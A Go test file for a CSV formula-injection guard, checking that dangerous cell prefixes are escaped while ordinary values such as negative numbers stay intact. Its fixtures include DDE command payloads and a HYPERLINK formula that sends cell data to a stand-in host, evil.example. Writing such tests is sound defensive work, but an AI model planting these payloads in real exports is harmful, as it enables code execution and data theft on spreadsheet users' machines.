package csvsafe

import (
	"bytes"
	"encoding/csv"
	"strings"
	"testing"
)

// Every prefix in the OWASP set must be neutralised. These are the exact
// shapes a hostile package name takes: a DDE payload, a hyperlink exfil, a
// leading control character that shifts the parse.
func TestFieldEscapesDangerousPrefixes(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{"equals dde", `=cmd|'/c calc'!A1`},
		{"plus dde", `+cmd|'/c calc'!A1`},
		{"minus formula", `-1+cmd|'/c calc'!A1`},
		{"at sum", `@SUM(1+1)*cmd|'/c calc'!A1`},
		{"tab then equals", "\t=1+1"},
		{"cr then equals", "\r=1+1"},
		{"hyperlink exfil", `=HYPERLINK("http://evil.example/?d="&A1,"click")`},
		{"leading space then equals", " =1+1"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Field(tc.in)
			if !strings.HasPrefix(got, "'") {
				t.Fatalf("Field(%q) = %q, want a leading single quote", tc.in, got)
			}
			if got != "'"+tc.in {
				t.Fatalf("Field(%q) = %q, want the value preserved after the prefix", tc.in, got)
			}
		})
	}
}

// The guard must not touch ordinary data. A negative number is the case that
// makes a naive "prefix anything starting with -" implementation corrupt real
// exports (install counts, deltas, score shifts).
func TestFieldLeavesOrdinaryValuesUntouched(t *testing.T) {
	cases := []string{
		"",
		"lodash",
		"-1",
		"-1.5",
		"-1.5e3",
		"+2.5",
		"-0",
		" -42 ",
		"1-2",
		"npm",
		"2026-08-31T00:00:00Z",
		"a=b",
		"user@example.com",
	}
	for _, in := range cases {
		if got := Field(in); got != in {
			t.Errorf("Field(%q) = %q, want it unchanged", in, got)
		}
	}
}

// Scoped npm packages start with `@`, so they ARE escaped. This is the
// deliberate cost of taking the OWASP set whole rather than carving out
// "looks like a package name": a spreadsheet already refuses to display
// `@babel/core` as text (Excel reads a leading `@` as a formula start and
// renders #NAME?), so the prefix improves display fidelity here rather than
// harming it — and a carve-out would be a second parser an attacker only has
// to satisfy. Pinned as a test so the noise is a decision, not a surprise.
func TestFieldEscapesScopedPackageNames(t *testing.T) {
	if got := Field("@babel/core"); got != "'@babel/core" {
		t.Fatalf("Field(\"@babel/core\") = %q, want the leading @ escaped", got)
	}
	if got := Field("@SUM(1+1)"); got != "'@SUM(1+1)" {
		t.Fatalf("formula not escaped: %q", got)
	}
	// The carve-out that DOES exist is numeric, and only numeric.
	if got := Field("-1"); got != "-1" {
		t.Fatalf("negative number corrupted: %q", got)
	}
}

// Applying the guard twice must not grow a second prefix — rows can pass
// through more than one layer (a helper plus a sweep) and a doubled prefix is
// a visible corruption.
func TestFieldIsIdempotent(t *testing.T) {
	once := Field(`=1+1`)
	twice := Field(once)
	if once != twice {
		t.Fatalf("not idempotent: once=%q twice=%q", once, twice)
	}
}

func TestRowEscapesEveryCellAndDoesNotMutateInput(t *testing.T) {
	in := []string{"npm", `=cmd|'/c calc'!A1`, "-1", ""}
	out := Row(in)
	want := []string{"npm", `'=cmd|'/c calc'!A1`, "-1", ""}
	for i := range want {
		if out[i] != want[i] {
			t.Errorf("Row()[%d] = %q, want %q", i, out[i], want[i])
		}
	}
	if in[1] != `=cmd|'/c calc'!A1` {
		t.Fatalf("Row mutated its input: %q", in[1])
	}
	if Row(nil) != nil {
		t.Fatal("Row(nil) must stay nil")
	}
}

// End-to-end through encoding/csv: the escaped cell must survive the CSV
// round-trip intact, so a downstream reader that strips the prefix recovers
// the exact original string.
func TestFieldSurvivesCSVRoundTrip(t *testing.T) {
	const payload = `=cmd|'/c calc'!A1,"x"`
	var buf bytes.Buffer
	cw := csv.NewWriter(&buf)
	if err := cw.Write(Row([]string{payload, "ok"})); err != nil {
		t.Fatal(err)
	}
	cw.Flush()
	if err := cw.Error(); err != nil {
		t.Fatal(err)
	}
	rec, err := csv.NewReader(bytes.NewReader(buf.Bytes())).Read()
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(rec[0], "'") {
		t.Fatalf("cell lost its escape through the CSV round-trip: %q", rec[0])
	}
	if strings.TrimPrefix(rec[0], "'") != payload {
		t.Fatalf("cell = %q, want the original payload after the prefix", rec[0])
	}
}
